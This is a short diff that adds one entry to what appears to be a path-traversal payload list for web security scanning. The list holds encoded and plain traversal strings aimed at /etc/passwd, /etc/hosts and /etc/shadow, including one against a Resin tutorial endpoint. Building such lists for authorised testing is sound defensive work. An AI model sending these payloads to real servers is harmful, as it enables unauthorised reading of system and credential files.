@@ -566,6 +566,7 @@ etc/passwd
 etc/hosts
 resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
 resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/hosts
+theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 ../../../../../../../../../../../../../etc/passwd
 ../../../../../../../../../../../../../../../../../etc/shadow
